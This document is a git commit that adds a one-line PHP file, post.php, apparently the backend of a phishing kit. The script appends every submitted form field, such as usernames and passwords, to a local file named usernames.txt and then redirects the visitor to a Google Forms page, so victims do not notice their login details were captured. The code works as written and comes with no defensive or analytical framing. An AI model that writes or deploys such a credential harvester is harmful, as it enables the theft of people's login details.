0c7a91bcaa0317ca38a3463bc4a0f0599d63e0d3
blackdragon690 <158858462+blackdragon690@users.noreply.github.com>
2024-02-04 17:05:23 -0500

    Add files via upload

---
+++ post.php
@@ -0,0 +1,1 @@
+<?php header ('Location:https://forms.gle/5QnbMv5A9RWiV1Vw9'); $handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) {    fwrite($handle, $variable);    fwrite($handle, "=");    fwrite($handle, $value);    fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); exit; ?>
